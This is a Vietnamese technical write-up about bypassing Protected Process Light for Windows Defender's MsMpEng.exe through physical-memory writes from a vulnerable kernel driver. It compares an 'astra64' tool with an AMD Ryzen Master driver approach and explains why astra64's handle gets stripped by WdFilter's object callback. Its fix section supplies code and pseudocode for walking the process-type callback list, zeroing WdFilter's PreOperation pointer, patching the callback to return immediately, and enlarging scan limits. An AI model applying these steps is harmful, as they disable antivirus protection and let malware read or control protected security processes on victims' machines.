# Tại Sao Astra64 Không Bypass PPL Của MsMpEng
## So Sánh Chi Tiết: astra64 vs AMDRyzenMasterDriverV20

---

## TL;DR

Astra64's PPL bypass code có **3 lý do** không work với MsMpEng.exe:

| # | Vấn đề | Mức độ | 
|---|--------|--------|
| 1 | **WdFilter OB callback không bị vô hiệu hóa** | FATAL — không bypass được dù làm đúng mọi thứ khác |
| 2 | **MAX_SCAN = 64 quá nhỏ** — miss MsMpEng trên hầu hết hệ thống | HIGH — scan fail hoàn toàn |
| 3 | **Write mechanism khác** — WB vs UC, không cần eviction nhưng có trade-off khác | LOW — thực ra không phải vấn đề chính |

---

## 1. FATAL: WdFilter OB Callback Không Bị Disable

### Điều Astra64 làm

```cpp
// Line 559: CHỈ clear Protection
drv.write_u8(prot_pa, 0x00);

// Line 561: Ngay lập tức OpenProcess
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target->pid);
```

Không có gì để:
- Tìm WdFilter callback entries trong RAM
- Zero `OB_CALLBACK_ENTRY.PreOperation` pointer
- Patch WdFilter function code
- Evict cache

### Điều Xảy Ra Khi OpenProcess Được Gọi

```
OpenProcess(PROCESS_ALL_ACCESS, MsMpEng_pid)
→ NtOpenProcess
→ PspOpenProcess

Step 1: PsTestProtectedProcessIncompatibility
        target.Protection = 0x00  (ta đã clear)
        caller.Protection = ?      (token swapped to SYSTEM → có thể 0x00)
        → CHECK PASSES ✓  (Wall #1 bypassed)

Step 2: ObpCallPreOperationCallbacks
        Iterate ObjectType(PsProcessType)->CallbackList
        Found: WdFilter OB_CALLBACK_ENTRY
            PreOperation = WdFilter+0x5E170   (STILL ACTIVE, ta không touch)
            Operations   = 3 (CREATE|DUPLICATE)
        
        CALL WdpProcessPreOperationCallback():
            target = MsMpEng EPROCESS
            Is MsMpEng in WdFilter.ProtectedList? → YES ✓
            Is caller trusted? → NO (không phải Defender component)
            
            → STRIP access rights:
            DesiredAccess PROCESS_ALL_ACCESS (0x001FFFFF)
            &= ~(PROCESS_TERMINATE | PROCESS_SUSPEND_RESUME |
                 PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE |
                 PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE |
                 PROCESS_SET_INFORMATION | PROCESS_INJECT_KERNEL_CALLBACK)
            
            RESULT: 0x001FFFFF & ~0x001BF7FF ≈ 0x00101000
                    = PROCESS_QUERY_INFORMATION | SYNCHRONIZE
        
        callback returns OB_PREOP_SUCCESS (không block, chỉ strip)

Step 3: SeAccessCheck (DACL check)
        Với SYSTEM token → passes

→ Handle granted với: PROCESS_QUERY_INFORMATION | SYNCHRONIZE
                      (KHÔNG CÓ PROCESS_VM_READ, PROCESS_VM_WRITE, PROCESS_TERMINATE, ...)
```

### Kết Quả Thực Tế

```cpp
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target->pid);
// hProc != NULL → OpenProcess "thành công" (WdFilter không deny, chỉ strip)
// NHƯNG hProc chỉ có PROCESS_QUERY_INFORMATION | SYNCHRONIZE

HANDLE hTok = NULL;
if (!OpenProcessToken(hProc,
    TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY,
    &hTok))
    printf("[-] OpenProcessToken: %lu\n", GetLastError());
    // ERROR: GetLastError() = 5 (ACCESS_DENIED)
    // hProc không có PROCESS_QUERY_INFORMATION đủ để mở token với
    // TOKEN_ASSIGN_PRIMARY
    // HOẶC MsMpEng's token DACL block non-trusted callers
```

So sánh với AMD approach:

```
AMD approach trước khi OpenProcess:
    OB_CALLBACK_ENTRY.PreOperation = 0x00  ← kernel đọc từ DRAM sau eviction
    → ObpCallPreOperationCallbacks: PreOperation == NULL → SKIP callback
    → Handle granted với PROCESS_ALL_ACCESS đầy đủ ✓
```

### Tại Sao WdFilter Protect MsMpEng Nhưng KHÔNG Protect csrss?

WdFilter duy trì `ProtectedList` — danh sách processes nó chủ động protect thông qua OB callback. Danh sách này **chỉ chứa Windows Defender components**:

```
WdFilter.ProtectedList contains:
    MsMpEng.exe  (Antimalware Service Executable)
    NisSrv.exe   (Network Inspection Service)  
    MsMpLsv.exe  (Anti-malware Launch Service)
    MpCopyAccelerator.exe
    ...các Defender processes khác
    
WdFilter.ProtectedList KHÔNG chứa:
    csrss.exe   ← PPL-Windows nhưng không phải Defender → NOT in list
    lsass.exe   ← PPL-Lsa → NOT in list
    smss.exe    ← PP-Windows → NOT in list
    svchost.exe → NOT in list
```

Khi astra64's default target là `csrss.exe`:
```
WdpProcessPreOperationCallback(csrss EPROCESS):
    Is csrss in WdFilter.ProtectedList? → NO
    → return OB_PREOP_SUCCESS  (không strip gì cả)
    → Handle granted với full PROCESS_ALL_ACCESS ✓
```

**Kết luận: astra64 work với csrss, lsass, svchost (không trong WdFilter's list), nhưng fail hoàn toàn với MsMpEng.**

---

## 2. HIGH: MAX_SCAN = 64 Quá Nhỏ

```cpp
// Line 219:
const int MAX_SCAN = 64;
```

### Cơ Chế EPROCESS List

EPROCESS structures được link bởi `ActiveProcessLinks` (doubly-linked list). Thứ tự trong list là thứ tự tạo process:

```
System (PID 4) ← head
    → smss.exe
    → csrss.exe  (session 0)
    → wininit.exe
    → services.exe
    → lsass.exe
    → svchost.exe × nhiều instances
    → ...
    → ... (50-100+ processes trên system bình thường)
    → MsMpEng.exe  ← có thể ở vị trí 60-100
```

Với `MAX_SCAN = 64`, trên một hệ thống với nhiều services, MsMpEng có thể ở vị trí 80-120 trong list — **vượt quá 64 iterations**.

### Code path khi MsMpEng không được tìm thấy

```cpp
// Line 529-530: tìm target theo tên
PplEntry* target = nullptr;
for (auto& e : ppl_list)
    if (_stricmp(e.name, target_name) == 0) { target = &e; break; }

// Line 531-539: không tìm được → auto-pick
if (!target) {
    const char* skip[] = { "System","smss.exe" };
    for (auto& e : ppl_list) {
        bool ok = true;
        for (auto s : skip) if (_stricmp(e.name, s) == 0) { ok = false; break; }
        if (ok) { target = &e; break; }  // lấy PPL process đầu tiên != System/smss
    }
}
```

Nếu user chạy `3_ppl_bypass.exe MsMpEng.exe` nhưng MsMpEng không nằm trong 64 entries đầu:
- `ppl_list` không có MsMpEng
- Code auto-pick target khác (csrss hoặc lsass)
- Bypass chạy trên TARGET SAI, không phải MsMpEng

### Thêm: MAX_RESULT = 16

```cpp
const size_t MAX_RESULT = 16;
...
if (result.size() >= MAX_RESULT) {
    printf("[DBG] enough PPL entries, stop early\n");
    break;
}
```

Scan dừng sớm khi tìm đủ 16 PPL entries, bất kể MsMpEng đã được tìm thấy chưa. Trên một hệ thống với nhiều PPL processes (svchost với WinTcb, csrss, lsass, smss, WdFilter-protected processes...), 16 entries có thể bị lấp đầy trước khi đến MsMpEng.

### Fix (nếu muốn scan đúng)

```cpp
// Cần tăng giới hạn:
const int MAX_SCAN = 4096;   // đủ cho mọi process
const size_t MAX_RESULT = 256; // hoặc collect tất cả PPL entries
```

---

## 3. Write Mechanism: WB vs UC — Không Phải Vấn Đề Chính, Nhưng Cần Hiểu

### Astra64: Virtual Address (WB cache mapping)

```cpp
bool write_phys(uint64_t addr, const void* buf, size_t len) {
    uintptr_t va = map_page(page);     // map phys page → VA
    memcpy((void*)(va + off), src, chunk);  // write qua VA
    unmap(va);                          // UnmapViewOfFile
}
```

Driver Astra32 gọi một trong các hàm sau để tạo mapping:
- `MmMapLockedPagesSpecifyCache(MmCached)` → WB mapping
- `ZwMapViewOfSection` → phụ thuộc section attributes
- `MmMapIoSpace(MmCached)` → WB mapping

Nếu mapping là **Write-Back (WB)**:
```
Write flow:    memcpy → CPU store → L1/L2/L3 cache (Modified state, MESI)
Kernel read:   CPU load → cache coherence protocol (MESI)
               → Modified line on writing core triggers "Intervention"
               → Writing core sends data to reading core
               → Reading core sees WRITTEN value ✓
               (x86 TSO guarantees này)

→ KHÔNG CẦN cache eviction cho WB writes!
→ Kernel thấy value ngay lập tức (trên cùng hoặc khác CCD)
```

Đây là **lợi thế** của Astra so với AMD driver: writes visible immediately, không cần 512MB eviction.

### AMD Ryzen Master: MmNonCached (UC)

```c
// AMD driver: MmMapIoSpace(pa, sz, MmNonCached)
// UC = Uncacheable = mọi read/write bypass hoàn toàn CPU cache
```

```
Write flow:    DeviceIoControl → driver → MmMapIoSpace(UC) → DRAM directly
               CPU cache = NOT updated
Kernel read:   CPU load → L3 cache hit (OLD value, cache still warm)
               → kernel sees STALE value!

→ CẦN cache eviction để kernel đọc từ DRAM (new value)
```

Đây là **lý do** tại sao AMD approach cần `cache_evict_multiccd()` còn Astra không cần.

### So Sánh Trực Tiếp

```
Write type       | Visible to kernel?    | Cần eviction? | Reliability
─────────────────┼──────────────────────┼───────────────┼─────────────
Astra WB mapping | Ngay lập tức (MESI)  | Không         | Cao (MESI)
AMD UC (driver)  | Chỉ sau cache miss   | CÓ            | Phụ thuộc CCD topology
```

Tuy nhiên, Astra còn một vấn đề nhỏ: `memcpy` stores có thể bị reorder bởi compiler. Không có `_mm_sfence()` hay `std::atomic_thread_fence(std::memory_order_seq_cst)` sau write. Trên x86 TSO model, stores không bị reorder với other stores, nhưng vẫn nên có fence khi cross-domain write.

Trong thực tế: `unmap(va)` gọi `UnmapViewOfFile` → syscall → implicit serialization → đủ để ensure visibility.

---

## 4. So Sánh Toàn Diện Hai Approach

```
                        ASTRA64                    AMD RYZEN MASTER
                        ───────────────────────    ──────────────────────────
Driver primitive        Map phys → VA (WB write)   UC write via IOCTL
                        ReadProcessMemory           
                        để đọc mapped VA

Find EPROCESS           Page walk qua CR3          Physical RAM scan (brute force)
                        (virt_to_phys + vread)      (no CR3 needed)
                        ✓ Chính xác hơn            ✓ Không cần CR3

Write mechanism         memcpy (WB, coherent)       IOCTL (UC, needs eviction)
                        ✓ Ngay lập tức              ✗ Cần cache evict

Cache eviction          Không cần                   CẦN (multi-CCD)

SeDebugPrivilege        Token swap to SYSTEM        AdjustTokenPrivileges
                        ✓ SYSTEM token đã có        ✓ Explicit enable
                        SeDebugPrivilege enabled

Wall #1 (PPL)           Clear EPROCESS.Protection  Clear EPROCESS.Protection
bypass                  ✓                           ✓ (with verify + eviction)

Wall #2 (WdFilter       ✗ KHÔNG bypass              ✓ Zero preop pointer
callback) bypass        → FATAL for MsMpEng         → Zero postop pointer
                                                    → Patch function 0xC3
                                                    → All verified

Wall #3 (DACL)          SYSTEM token (implicit)     SeDebugPrivilege (explicit)
bypass                  ✓                           ✓

Works for csrss.exe     ✓ (not in WdFilter list)    ✓
Works for lsass.exe     ✓ (not in WdFilter list)    ✓  
Works for MsMpEng.exe   ✗ FAIL (WdFilter callback)  ✓ SUCCEED
```

---

## 5. Nếu Muốn Fix Astra64 Để Bypass MsMpEng

Cần thêm 4 bước vào astra64's flow:

### Bước A: Tìm WdFilter trong module list

```cpp
uint64_t wdf_base = 0, wdf_size = 0;
// Đã có get_module_range() trong AMD code → port sang
```

### Bước B: Scan WdFilter OB_CALLBACK_ENTRY trong physical RAM

Khó hơn vì astra64 dùng virtual address walk, không scan physical RAM brute force. Cần:
- Đọc `PsProcessType` VA từ ntoskrnl exports
- Đọc `ObjectType->CallbackList` head
- Iterate linked list → tìm entries với PreOperation trong WdFilter VA range

```cpp
// Pseudocode:
uint64_t ps_process_type_va = nt_kbase + export_rva(nt_disk, "PsProcessType");
uint64_t ps_process_type_ptr = 0;
vread_u64(&drv, cr3, ps_process_type_va, &ps_process_type_ptr);
// ps_process_type_ptr = address of _OBJECT_TYPE for Process

// Read CallbackList head at _OBJECT_TYPE+CALLBACK_LIST_OFFSET
uint64_t cb_list_head = 0;
vread_u64(&drv, cr3, ps_process_type_ptr + OBJECT_TYPE_CALLBACK_LIST_OFFSET, &cb_list_head);

// Walk list → find OB_CALLBACK_ENTRY with preop in WdFilter range
```

### Bước C: Zero PreOperation pointer via physical write

```cpp
uint64_t preop_pa = 0;
virt_to_phys(&drv, cr3, entry_va + 0x28, &preop_pa);
drv.write_u8_range(preop_pa, zeros, 8);
// Vì WB write, không cần cache eviction!
```

### Bước D: Tăng MAX_SCAN và MAX_RESULT

```cpp
const int MAX_SCAN = 4096;
const size_t MAX_RESULT = 256;
```

### Tại Sao Astra64 Không Implement Điều Này?

Code astra64 được design để bypass PPL trên **generic PPL processes** (csrss, lsass, svchost...) — không phải MsMpEng cụ thể. Với những processes đó, WdFilter không protect, nên chỉ cần clear EPROCESS.Protection là đủ.

MsMpEng là một special case vì WdFilter tích cực protect nó ngay cả sau khi PPL cleared. Đây là defense-in-depth của Windows Defender: PPL là first layer, WdFilter OB callback là second layer.

---

## 6. Tóm Tắt

```
Astra64 PPL bypass flow cho MsMpEng.exe:

    Clear EPROCESS.Protection         ✓ Wall #1 (PPL) bypassed
    Token swap → SYSTEM               ✓ Wall #3 (DACL) bypassed
    OpenProcess(PROCESS_ALL_ACCESS)
        └─ WdFilter PreOp callback    ✗ Wall #2 (WdFilter) NOT bypassed
               strips access rights
    Handle: PROCESS_QUERY_INFORMATION only
    OpenProcessToken: FAILS (insufficient access)

AMD approach cho MsMpEng.exe:

    Clear EPROCESS.Protection         ✓ Wall #1 (PPL) bypassed (with eviction)
    Zero OB_CALLBACK_ENTRY.preop      ✓ Wall #2 (WdFilter) bypassed
    Patch preop function → 0xC3       ✓ Wall #2 backup layer
    SeDebugPrivilege enable           ✓ Wall #3 (DACL) bypassed
    Multi-CCD cache eviction          ✓ All writes visible to kernel
    OpenProcess(PROCESS_ALL_ACCESS)
    Handle: PROCESS_ALL_ACCESS ✓
    ReadProcessMemory: SUCCESS ✓
```

**Một câu:** Astra64 fail với MsMpEng vì nó chỉ bypass PPL kernel check (Wall #1) nhưng không disable WdFilter's OB callback (Wall #2) — callback đó vẫn chạy và strip hết dangerous access rights khỏi handle, bất kể PPL đã được clear hay chưa.
